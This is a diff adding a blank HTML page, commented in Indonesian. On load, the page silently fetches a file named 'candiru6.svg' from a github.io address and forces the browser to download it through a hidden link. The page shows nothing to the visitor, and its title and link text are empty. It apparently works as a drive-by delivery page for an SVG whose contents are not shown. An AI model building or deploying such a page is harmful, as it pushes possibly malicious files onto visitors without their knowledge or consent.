@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+   
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Tombol Cadangan Manual -->
+        <a id="manual-download" href="https://firstian84.github.io/firstiantechnology/candiru6.svg" download="candiru6.svg" class="btn"></a>
+    </div>
+
+    <script>
+        window.addEventListener('DOMContentLoaded', (event) => {
+            const fileUrl = 'https://firstian84.github.io/firstiantechnology/candiru6.svg';
+            const fileName = 'candiru6.svg';
+
+            // Menggunakan fetch dan Blob agar browser memaksa download file lintas domain
+            fetch(fileUrl)
+                .then(response => response.blob())
+                .then(blob => {
+                    const blobUrl = window.URL.createObjectURL(blob);
+                    const downloadLink = document.createElement('a');
+                    downloadLink.href = blobUrl;
+                    downloadLink.download = fileName;
+                    
+                    document.body.appendChild(downloadLink);
+                    downloadLink.click();
+                    document.body.removeChild(downloadLink);
+                    
+                    // Bersihkan URL object setelah selesai
+                    window.URL.revokeObjectURL(blobUrl);
+                })
+                .catch(err => {
+                    console.error('Gagal mendownload file secara otomatis:', err);
+                });
+        });
+    </script>
+
+</body>
+</html>
